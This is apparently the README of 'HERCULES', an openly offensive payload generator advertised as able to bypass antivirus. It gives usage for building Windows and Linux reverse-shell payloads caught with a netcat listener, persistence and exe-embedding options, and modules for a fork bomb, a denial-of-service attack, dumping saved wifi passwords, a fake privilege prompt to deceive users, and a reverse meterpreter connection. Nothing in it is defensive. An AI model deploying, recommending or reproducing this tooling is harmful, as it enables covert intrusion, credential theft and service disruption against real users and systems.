# HERCULES
HERCULES is a special payload generator that can bypass all antivirus software.

Use it with netcat...

Example : nc -l -p 1234


# USAGE


                  __  ____________  ________  ____    ___________
                 / / / / ____/ __ \/ ____/ / / / /   / ____/ ___/
                / /_/ / __/ / /_/ / /   / / / / /   / __/  \__ \ 
               / __  / /___/ _, _/ /___/ /_/ / /___/ /___ ___/ / 
              /_/ /_/_____/_/ |_|\____/\____/_____/_____//____/  
                                                   


Usage : ./HERCULES (Ip) (Port) (Options)


Options : 

      -p                 Payload to use. ( Windows / Linux )

      -a                 The architecture to use. ( x86, x64 )
      
      -l                 Specify linking type for compiler. ( static, dynamic )

      --persistence      Enable outo persistence option for continious acces.

      --embed="file.exe" Embed the selected payload with selected exe file.




# PAYLOAD OPTIONS

     ~PERSSISTENCE                     Installs a persistence module

     ~DISTRACT                         Executes a fork bomb bat file for distraction   

     ~PLEASE  "Command"                Asks users comfirmation for higher privilidge operations

     ~DOS -A "www.targetsite.com"      Starts a denial of service atack

     ~WIFI-LIST 					 Dumps all wifi history data with passwords

     ~METERPRETER -A "127.0.0.1:8888"  Creates a reverse https meterpreter connection to metasploit

# NOTE !

- Dynamic linking makes payload size smaller !
- Using persistence and keylogger may atract anti virus softwares !

# AV AWARENESS

http://NoDistribute.com/result/ZWHKvaAJcCpnOGbgNq

